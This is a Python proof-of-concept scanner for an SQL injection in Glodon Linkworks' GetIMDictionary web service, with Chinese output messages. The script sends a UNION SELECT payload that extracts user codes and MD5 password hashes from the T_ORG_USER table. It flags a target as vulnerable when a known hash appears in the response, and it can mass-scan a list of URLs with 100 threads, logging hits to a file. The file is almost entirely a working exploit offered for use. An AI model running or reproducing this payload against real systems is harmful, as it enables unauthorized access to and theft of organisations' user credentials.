import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test=""" _     _  _      _  __ _      ____  ____  _  __ ____        ____  ____  _    
/ \   / \/ \  /|/ |/ // \  /|/  _ \/  __\/ |/ // ___\      / ___\/  _ \/ \   
| |   | || |\ |||   / | |  ||| / \||  \/||   / |    \_____ |    \| / \|| |   
| |_/\| || | \|||   \ | |/\||| \_/||    /|   \ \___ |\____\\___ || \_\|| |_/\
\____/\_/\_/  \|\_|\_\\_/  \|\____/\_/\_\\_|\_\\____/      \____/\____\\____/
                                                                             

"""

    print(test)



def main():
    banner()
    parser=argparse.ArgumentParser(description='广联达 Linkworks GetIMDictionarySQL 注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    url_payload= '/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
    headers={
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded',
    }
    data=" key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER -- "


    try:
        res1=requests.post(url=target+url_payload,headers=headers,data=data,timeout=10)
        if res1.status_code==200 and '5F4DCC3B5AA765D61D8327DEB662CF99' in res1.text:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')



if __name__ =='__main__':
    main()
